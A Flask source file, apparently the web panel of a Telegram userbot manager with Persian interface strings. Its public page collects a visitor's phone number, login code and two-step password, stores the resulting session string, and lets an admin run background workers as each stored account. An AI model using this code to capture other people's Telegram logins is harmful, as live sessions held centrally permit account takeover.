import os
import asyncio
import threading
from concurrent.futures import TimeoutError as FutureTimeoutError
from flask import Flask, render_template, request, redirect, url_for, session, flash

from config import SECRET_KEY, PANEL_PASSWORD, API_ID, API_HASH
from database import init_db, save_user, get_user, get_all_users, delete_user
from clients import send_code, sign_in, check_password, get_groups
from workers import start_worker, stop_worker, start_all_active

app = Flask(__name__)
app.secret_key = SECRET_KEY

# ---------- Event Loop اختصاصی ----------
LOOP = asyncio.new_event_loop()

def _run_loop():
    asyncio.set_event_loop(LOOP)
    LOOP.run_forever()

threading.Thread(target=_run_loop, daemon=True).start()

def run_async(coro, timeout=90):
    future = asyncio.run_coroutine_threadsafe(coro, LOOP)
    try:
        return future.result(timeout=timeout)
    except FutureTimeoutError:
        future.cancel()
        return "timeout"
    except Exception as e:
        return f"error: {str(e)}"

init_db()

# ---------- روت‌های لاگین اکانت ----------
@app.route("/")
def index():
    return render_template("login.html")

@app.route("/send_code", methods=["POST"])
def send_code_route():
    phone = request.form.get("phone", "").strip()
    if not phone:
        flash("شماره را وارد کنید", "danger")
        return redirect(url_for("index"))

    result = run_async(send_code(phone))
    if result is True:
        session["phone"] = phone
        return render_template("code.html", phone=phone)
    else:
        flash(str(result), "danger")
        return redirect(url_for("index"))

@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = session.get("phone")
    code = request.form.get("code", "").strip()
    if not phone:
        flash("نشست منقضی شده", "danger")
        return redirect(url_for("index"))

    result = run_async(sign_in(phone, code))
    if result == "need_password":
        return render_template("password.html", phone=phone)
    elif isinstance(result, str) and len(result) > 40:
        # موفق
        groups = run_async(get_groups(result))
        if not isinstance(groups, list):
            groups = []
        save_user(phone, result, cached_groups=groups, is_active=False)
        session.pop("phone", None)
        flash("اکانت با موفقیت اضافه شد", "success")
        return redirect(url_for("admin"))
    else:
        flash(str(result), "danger")
        return redirect(url_for("index"))

@app.route("/verify_password", methods=["POST"])
def verify_password():
    phone = session.get("phone")
    password = request.form.get("password", "").strip()
    if not phone:
        return redirect(url_for("index"))

    result = run_async(check_password(phone, password))
    if isinstance(result, str) and len(result) > 40:
        groups = run_async(get_groups(result))
        if not isinstance(groups, list):
            groups = []
        save_user(phone, result, cached_groups=groups, is_active=False)
        session.pop("phone", None)
        flash("اکانت با موفقیت اضافه شد", "success")
        return redirect(url_for("admin"))
    else:
        flash(str(result), "danger")
        return redirect(url_for("index"))

# ---------- پنل ادمین ----------
@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        if request.form.get("password") == PANEL_PASSWORD:
            session["is_admin"] = True
            start_all_active(LOOP)
            return redirect(url_for("dashboard"))
        flash("رمز اشتباه است", "danger")
    if session.get("is_admin"):
        return redirect(url_for("dashboard"))
    return render_template("admin_login.html")

@app.route("/dashboard")
def dashboard():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))

    managed = session.get("managed_phone")
    all_users = get_all_users()

    if not managed and all_users:
        managed = all_users[0]["phone"]
        session["managed_phone"] = managed

    user = get_user(managed) if managed else None
    groups = user.get("cached_groups") or [] if user else []

    return render_template(
        "dashboard.html",
        managed_phone=managed,
        user=user,
        groups=groups,
        all_users=all_users
    )

@app.route("/switch/<phone>")
def switch_user(phone):
    if not session.get("is_admin"):
        return redirect(url_for("admin"))
    if get_user(phone):
        session["managed_phone"] = phone
    return redirect(url_for("dashboard"))

@app.route("/save", methods=["POST"])
def save_settings():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))

    phone = session.get("managed_phone")
    user = get_user(phone)
    if not user:
        return redirect(url_for("dashboard"))

    selected = request.form.getlist("groups")
    meow = request.form.get("meow_enabled") == "on"
    fish = request.form.get("fish_enabled") == "on"
    active = request.form.get("is_active") == "on"

    save_user(
        phone,
        user["session_string"],
        selected_groups=selected,
        meow_enabled=meow,
        fish_enabled=fish,
        is_active=active,
        cached_groups=user.get("cached_groups")
    )

    if active:
        start_worker(phone, LOOP)
    else:
        stop_worker(phone)

    flash("تنظیمات ذخیره شد", "success")
    return redirect(url_for("dashboard"))

@app.route("/remove", methods=["POST"])
def remove_user():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))
    phone = request.form.get("phone")
    stop_worker(phone)
    delete_user(phone)
    if session.get("managed_phone") == phone:
        session["managed_phone"] = None
    flash("اکانت حذف شد", "success")
    return redirect(url_for("dashboard"))

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("admin"))

if __name__ == "__main__":
    start_all_active(LOOP)
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
